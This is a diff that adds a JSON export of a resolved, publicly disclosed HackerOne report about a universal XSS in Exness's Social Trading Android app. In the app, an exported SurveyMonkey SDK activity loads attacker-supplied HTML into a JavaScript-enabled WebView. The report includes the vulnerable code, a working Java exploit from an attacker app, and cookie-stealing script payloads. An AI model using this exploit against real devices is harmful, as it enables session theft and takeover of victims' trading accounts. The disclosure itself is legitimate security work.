@@ -1,0 +1,581 @@
+{
+  "id": 1455987,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDU1OTg3",
+  "url": "https://hackerone.com/reports/1455987",
+  "title": "Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-01-20T23:38:30.344Z",
+  "submitted_at": "2022-01-20T23:38:30.545Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "holyfield",
+    "url": "/holyfield",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 12719,
+    "url": "https://hackerone.com/exness",
+    "handle": "exness",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "EXNESS",
+      "twitter_handle": "",
+      "website": "https://www.exness.com",
+      "about": "We provide best trading conditions across multiple markets for clients all over the world."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-13T15:36:59.294Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-04-13T15:36:59.244Z",
+  "team_member_agreed_on_going_public_at": "2022-04-13T15:31:06.954Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Affected App: Social Trading (com.exness.investments)\n## App Version: - 2.45.8-release (latest on PlayStore)\n\n# Summary:\nThe **SurveyMonkey** SDK, used to collect surveys from users for analytic and informative purposes, was implemented in an insecure manner in . Particularly, the `SMFeedbackActivity` was exported, allowing any app installed on user's device to launch it. In the implementation details stated on Github (see References), it is expected that the SDK would be initialized programmatically and not via an exported activity. Nevertheless, this in itself does not make the app vulnerable.\n\nThe vulnerability surfaces because the exported activity, `SMFeedbackActivity`, is a Fragment which loads data into a WebView by supplying externally controlled `Intent Extras` into the `loadDataWithBaseURL()` method of the WebView. This method accepts a `baseURL` and `HTML` data as parameters and uses their values to load the WebView, with JavaScript enabled. The function of this method is that when a `baseURL` is supplied, the WebView treats the HTML content in the `HTML` data as though it's a content that was loaded when the `baseURL` was visited. For example, supplying `https://my.exness.com` as `baseURL` and `<script>document.write(document.cookies)</script>` would write out the cookies of `my.exness.com` stored in the app's internal storage. The same is applicable for all cookies stored for every other site visited through the various WebViews in the Social Trading app because all cookies are stored in a single file.\n\nTherefore, a malicious app can start up the vulnerable activity--which is actually a fragment, being an extension of the `Fragment` super class--and supply the intent with malicious `Intent Extras` containing any website as well as JavaScript payload to steal user's Cookies or execute OSRF (On-Site Request Forgery) attacks.\n\nHere's the vulnerable piece of code:\n**AndroidManifest.xml**\n**Desc:** The exported activity.\n\n```xml\n<activity android:name=\"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity\" ...>\n  <intent-filter>\n      <action android:name=\"android.intent.action.MAIN\"/>\n  </intent-filter>\n</activity>\n```\n\n**com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity**\n**Desc:** The last line `onCreate()` method launches the Fragment with attacker-supplied Intent Extras.\n\n```java\n@Override // androidx.fragment.app.FragmentActivity\npublic void onCreate(android.os.Bundle bundle) {\n  super.onCreate(bundle);\n  android.content.Intent intent = getIntent();\n  this.f11369c = intent.getStringExtra(\"smSPageHTML\");\n  this.f11370d = intent.getStringExtra(\"smSPageURL\");\n  if (this.f11369c == null) {\n    ...\n  } else if (bundle == null) {\n    ...\n    android.os.Bundle bundle2 = new android.os.Bundle();\n    bundle2.putString(\"smSPageURL\", str);\n    bundle2.putString(\"smSPageHTML\", str2);\n    bundle2.putBoolean(\"smHasLoadedSPageHTML\", true);\n    sMFeedbackFragment.setArguments(bundle2);\n    beginTransaction.add(16908290, sMFeedbackFragment, com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment.f11372p).commit();\n  }\n}\n```\n\n**com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment**\n**Desc:** After some bypassable validations of the URL, the attacker-data is loaded in WebView in `loadDataWithBaseURL()` below\n```java\npublic class SMFeedbackFragment extends androidx.fragment.app.Fragment implements p000.AbstractC8582mU{\n\t...\n\n\tpublic final void m4704b() {\n    if (getView() != null) {\n      this.f11382n = android.app.ProgressDialog.show(getActivity(), null, getString(com.surveymonkey.surveymonkeyandroidsdk.R$string.sm_loading_status));\n      this.f11376g = true;\n      this.f11373c = (android.webkit.WebView) getView().findViewById(com.surveymonkey.surveymonkeyandroidsdk.R$id.sm_feedback_webview);\n      this.f11373c.getSettings().setJavaScriptEnabled(true);\n      this.f11373c.setWebViewClient(new com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackFragment.C7006c(null));\n      this.f11373c.loadDataWithBaseURL(this.smSPageURL, this.smSPageHTML, null, \"UTF-8\", null);\n    }\n  }\n  ...\n}\n```\n\n# Steps to Reproduce:\n\n  1. Install the latest version of Social Trading (com.exness.investments) from Play Store.\n  2. Install the attacker App attached to this report\n  3. Launch the attacker's app\n  4. The Exness Trading App will open up. After a few seconds, the vulnerable Fragment will be launched, loading `my.exness.asia`.\n  5. After a few more seconds, the Fragment will be relaunched with attacker's payload to show the user's cookies.\n  6. You'll see the user's cookies exposed, and if the user had also logged to any other Website, e.g., through the Payments WebView, the same exploit still works.\n\n**Exploit Code In Attacker App**\n```java\nIntent exnessIntent = getPackageManager().getLaunchIntentForPackage(\"com.exness.investments\");\nstartActivity(exnessIntent);\nfinal Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.putExtra(\"smSPageHTML\", \"<h1>Exploited</h1><script>location.href='/r/'</script>\");\nintent.putExtra(\"smSPageURL\", \"https://my.exness.asia/r/\");\ntry {\n    intent.setClassName(createPackageContext(\"com.exness.investments\", Context.CONTEXT_IGNORE_SECURITY), \"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity\");\n} catch (PackageManager.NameNotFoundException e) {\n    e.printStackTrace();\n}\nnew Handler().postDelayed(new Runnable() {\n    @Override\n    public void run() {\n        startActivity(intent);\n    }\n}, 8000);\n\nfinal Intent intent2 = new Intent(\"android.intent.action.VIEW\");\nintent2.putExtra(\"smSPageHTML\", \"<h1<Exploited</h1><script>document.write(document.cookie)</script>\");\nintent2.putExtra(\"smSPageURL\", \"https://my.exness.asia/r/\");\ntry {\n    intent2.setClassName(createPackageContext(\"com.exness.investments\", Context.CONTEXT_IGNORE_SECURITY), \"com.surveymonkey.surveymonkeyandroidsdk.SMFeedbackActivity\");\n} catch (PackageManager.NameNotFoundException e) {\n    e.printStackTrace();\n}\n\nnew Handler().postDelayed(new Runnable() {\n    @Override\n    public void run() {\n        startActivity(intent2);\n    }\n}, 20000);\n```\n\nIf a user had logged in to any site using any WebView controlled by the Exness app, as would be seen below, the user's account can be hijacked through theft of the user's `JWT` token.\n\nHere's a short video PoC\n\n█████████\n\n## Impact\n\n* Theft of user cookies for all sites which would lead to account takeovers\n* Attacker would compromise victim's credentials and data\n* Attacker would see victim's open and closed positions and also make unfavorable modifications\n* Attacker would be able to change victim's strategies and portfolios, leading to losses\n* Attacker could make withdrawals from victim's account, especially if 2FA through phone number is enabled in the Exness app and the Attaking\n\n## Mitigation\nThe exported activity should not be exported. Adding `exported=\"false\"` to the activity would ensure a third-party app would not be able to launch it.\n\n\n## Supporting Material/References:\n\n  * Attacker App - ██████████\n  * Video PoC - █████\n  * [Implementation details of Survey Monkey Android SDK](https://github.com/SurveyMonkey/surveymonkey-android-sdk/)",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 8,
+  "voters": [
+    "alp",
+    "zy9ard3",
+    "sudi",
+    "h4x0r_dz",
+    "shivammusic",
+    "r_dex",
+    "massto",
+    "jpclaudino"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 35808,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.exness.investments",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 15128708,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "████\n\n███████ ████████\n\nI███\n\n\n█████\n\n## Attachments\n 1. ███████\n 2. ████\n\nBest regards,\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-21T08:15:56.033Z",
+      "updated_at": "2022-04-13T15:18:45.807Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15128765,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "> Just as a side note, the reason why Google Chrome is launched to load the URL is due to SurveyMonkey using a URL validation to only load `surveymonkey.com` site in its WebView. However, this does not affect the exploit in any way. In fact, it could have been done without triggering that aspect, because the URL validation was easily bypassed as I've found.\n\nBest regards,\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-21T08:24:10.680Z",
+      "updated_at": "2022-01-21T08:25:00.004Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15143754,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @holyfield,\n\nThank you for posting this report.\nWe are currently investigating the issue and will respond to you as soon as possible.",
+      "automated_response": false,
+      "created_at": "2022-01-21T18:09:59.790Z",
+      "updated_at": "2022-01-21T18:09:59.790Z",
+      "actor": {
+        "username": "mickey01x",
+        "cleared": false,
+        "verified": false,
+        "url": "/mickey01x",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15166436,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @mickey01x,\n\n█████████\n\n█████████\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-24T09:10:30.528Z",
+      "updated_at": "2022-04-13T15:27:36.171Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15167248,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": null,
+      "automated_response": false,
+      "created_at": "2022-01-24T09:41:12.371Z",
+      "updated_at": "2022-01-24T09:41:12.371Z",
+      "additional_data": {
+        "old_severity": "High (7.8)",
+        "new_severity": "Medium",
+        "old_severity_id": 1367789,
+        "new_severity_id": 1371088
+      },
+      "actor": {
+        "username": "maximg",
+        "cleared": false,
+        "verified": false,
+        "url": "/maximg",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15167370,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "████████ ",
+      "automated_response": false,
+      "created_at": "2022-01-24T09:46:27.528Z",
+      "updated_at": "2022-04-13T15:11:42.290Z",
+      "actor": {
+        "username": "maximg",
+        "cleared": false,
+        "verified": false,
+        "url": "/maximg",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15167629,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "████\n\n██████████\n█████\n\n██████████\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-24T09:57:45.053Z",
+      "updated_at": "2022-04-13T15:23:48.743Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15172328,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "███████ ",
+      "automated_response": false,
+      "created_at": "2022-01-24T13:38:15.823Z",
+      "updated_at": "2022-04-13T15:24:20.618Z",
+      "actor": {
+        "username": "maximg",
+        "cleared": false,
+        "verified": false,
+        "url": "/maximg",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15172711,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "█████████",
+      "automated_response": false,
+      "created_at": "2022-01-24T14:06:09.031Z",
+      "updated_at": "2022-04-13T15:24:54.678Z",
+      "actor": {
+        "username": "maximg",
+        "cleared": false,
+        "verified": false,
+        "url": "/maximg",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15172921,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "████████ ██████\n\nThanks.",
+      "automated_response": false,
+      "created_at": "2022-01-24T14:22:29.797Z",
+      "updated_at": "2022-04-13T15:25:25.942Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15173312,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "████\n\n███\n\n████████\n████\n\n███\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-24T14:50:11.796Z",
+      "updated_at": "2022-04-13T15:28:16.783Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15177707,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "███\n\n██████\n\n████\nThanks.\n\n█████████\n@holyfield.",
+      "automated_response": false,
+      "created_at": "2022-01-24T21:07:32.375Z",
+      "updated_at": "2022-04-13T15:29:20.674Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15186058,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-01-25T11:58:36.456Z",
+      "updated_at": "2022-01-25T11:58:36.456Z",
+      "actor": {
+        "url": "/exness",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "EXNESS"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "exness",
+      "collaborator": {
+        "username": "holyfield",
+        "url": "/holyfield"
+      }
+    },
+    {
+      "id": 15187204,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "█████████\n\n███",
+      "automated_response": false,
+      "created_at": "2022-01-25T13:19:59.828Z",
+      "updated_at": "2022-04-13T15:29:48.486Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 15264891,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "We have fixed the issue and submitted it.\nThank you for making Exness services more secure!",
+      "automated_response": false,
+      "created_at": "2022-01-31T12:56:44.468Z",
+      "updated_at": "2022-01-31T12:56:44.468Z",
+      "actor": {
+        "username": "maximg",
+        "cleared": false,
+        "verified": false,
+        "url": "/maximg",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "holyfield",
+        "url": "/holyfield"
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 16280686,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Hi @holyfield,\n\nWe would like to disclose this report.",
+      "automated_response": false,
+      "created_at": "2022-04-13T15:31:06.984Z",
+      "updated_at": "2022-04-13T15:31:40.631Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mickey01x",
+        "cleared": false,
+        "verified": false,
+        "url": "/mickey01x",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 16280754,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-04-13T15:36:59.269Z",
+      "updated_at": "2022-04-13T15:36:59.269Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 16280755,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-04-13T15:36:59.350Z",
+      "updated_at": "2022-04-13T15:36:59.350Z",
+      "actor": {
+        "username": "holyfield",
+        "cleared": false,
+        "verified": true,
+        "url": "/holyfield",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ezh7jrprd7w1tmgdu28ik6yqnwco/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    },
+    {
+      "id": 16299749,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CommentsClosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-04-14T18:12:18.520Z",
+      "updated_at": "2022-04-14T18:12:18.520Z",
+      "actor": {
+        "url": "/exness",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "EXNESS"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "exness"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
